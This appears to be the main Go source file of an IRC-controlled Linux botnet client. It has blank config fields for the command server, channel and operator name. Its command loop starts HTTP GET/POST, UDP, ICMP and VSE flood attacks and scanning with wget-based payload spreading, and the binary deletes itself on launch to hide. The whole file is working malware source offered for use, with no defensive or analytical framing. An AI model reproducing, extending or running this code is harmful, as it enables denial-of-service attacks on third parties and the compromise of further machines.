package main

import (
	"bufio"
	"fmt"
	"net/textproto"
	"os"
	"runtime"

	"bot/pkg"
)

var (
	IRC_Server        = "" //config IRC server and port here. //ip:port //127.0.0.1:6667
	IRC_Backup_Server = "" //config like main server.
	IRC_Channel       = "" //config channel here. //"#Example"
	IRC_Chan_Password = "" //config channel password here. //If you didn't have, Just leave it blank.
	IRC_USNM          = "" //config your IRC username here. //For acces to your bot commands.
	New_Payload_Name  = "" //config new payload name. //For wget process.
)

type reader struct {
	read string
}

func (read *reader) botAccess() bool {
	return pkg.IRCfind(pkg.IRCrecv(read.read, 0), IRC_USNM)
}

func bot(server string) error {
	conn := pkg.IRCconn(server)
	tp := textproto.NewReader(bufio.NewReader(conn))

	irc := &pkg.IRC{
		Report:  conn,
		Channel: IRC_Channel,
		ChanKey: IRC_Chan_Password,
	}
	irc.IRClogin()

	for {
		ircRead, err := tp.ReadLine()
		if err != nil {
			return err
		}
		read := &reader{
			read: ircRead,
		}

		go func() {
			if pkg.IRCfind(ircRead, "PING :") {
				irc.IRCsend("PONG " + pkg.IRCrecv(ircRead, 1))
			}
		}()

		//Check is user modes and Join IRC channel
		if pkg.IRCfind(ircRead, "+i") || pkg.IRCfind(ircRead, "+w") || pkg.IRCfind(ircRead, "+x") {
			irc.IRCsend(fmt.Sprint("JOIN " + IRC_Channel + IRC_Chan_Password))
		}

		go func() {
			switch {
			case pkg.IRCfind(ircRead, "?get") && read.botAccess():
				pkg.AttackSwitch = false
				go irc.GET(pkg.IRCrecv(ircRead, 4))
				irc.IRCreport("START HTTP GET FLOOD TO: " +
					pkg.IRCrecv(ircRead, 4))
			case pkg.IRCfind(ircRead, "?post") && read.botAccess():
				pkg.AttackSwitch = false
				go irc.POST(pkg.IRCrecv(ircRead, 4))
				irc.IRCreport("START HTTP POST FLOOD TO: " +
					pkg.IRCrecv(ircRead, 4))
			case pkg.IRCfind(ircRead, "?udp") && read.botAccess():
				pkg.AttackSwitch = false
				go irc.DUDP(pkg.IRCrecv(ircRead, 4),
					pkg.IRCrecv(ircRead, 5))
				irc.IRCreport("START UDP FLOOD TO: " +
					pkg.IRCrecv(ircRead, 4))
			case pkg.IRCfind(ircRead, "?icmp") && read.botAccess():
				pkg.AttackSwitch = false
				go irc.ICMP(pkg.IRCrecv(ircRead, 4))
				irc.IRCreport("START ICMP FLOOD TO: " +
					pkg.IRCrecv(ircRead, 4))
			case pkg.IRCfind(ircRead, "?vse") && read.botAccess():
				pkg.AttackSwitch = false
				go irc.VSE(pkg.IRCrecv(ircRead, 4))
				irc.IRCreport("START VSE FLOOD TO: " +
					pkg.IRCrecv(ircRead, 4))
			case pkg.IRCfind(ircRead, "?scan") && read.botAccess():
				go irc.ScanMode(pkg.IRCrecv(ircRead, 4),
					pkg.IRCrecv(ircRead, 5), New_Payload_Name)
				irc.IRCreport("START SCANNING.")
			case pkg.IRCfind(ircRead, "?info") && read.botAccess():
				irc.ReportInfo()
			case pkg.IRCfind(ircRead, "?kill") && read.botAccess():
				os.Exit(0)
			case pkg.IRCfind(ircRead, "?stopddos") && read.botAccess():
				pkg.AttackSwitch = true
				irc.IRCreport("STOP ATTACKING.")
			case pkg.IRCfind(ircRead, "?stopscan") && read.botAccess():
				pkg.ScanSwitch = true
				irc.IRCreport("STOP SCANNING.")
			}
		}()
	}
}

func main() {
	os.Remove(os.Args[0])
	if runtime.GOOS != "linux" {
		os.Exit(0)
	}

	if bot(IRC_Server) != nil {
		for {
			if bot(IRC_Backup_Server) == nil {
				break
			}
		}
	}
}
